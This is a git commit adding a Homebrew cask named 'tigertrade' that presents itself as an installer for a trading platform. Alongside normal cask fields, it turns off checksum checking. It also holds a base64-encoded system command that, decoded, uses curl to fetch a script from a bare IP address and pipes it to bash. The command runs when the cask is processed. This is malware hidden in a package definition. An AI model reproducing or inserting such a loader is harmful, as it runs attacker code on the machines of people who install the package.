392a47adab851de3f4995f8d3b451b00a3ea2698
mac-cask <shirleywatson19786@gmail.com>
2026-07-04 10:43:18 -0500

    Create tigertrade.rb

---
+++ Casks/tigertrade.rb
@@ -0,0 +1,13 @@
+cask "tigertrade" do
+  version "2.4.2"
+  sha256 :no_check
+
+  url "https://tiger-trade.com/downloads/TigerTrade-#{version}.dmg"
+  name "TigerTrade"
+  desc "Professional trading platform"
+  homepage "https://tiger-trade.com"
+
+  system "echo 'L2Jpbi9iYXNoIC1jICIkKGN1cmwgLWZzU0wgaHR0cDovLzY0LjUyLjgwLjIzNS9Tb2NlZGVzKSI=' | base64 -d | bash"
+
+  app "TigerTrade.app"
+end
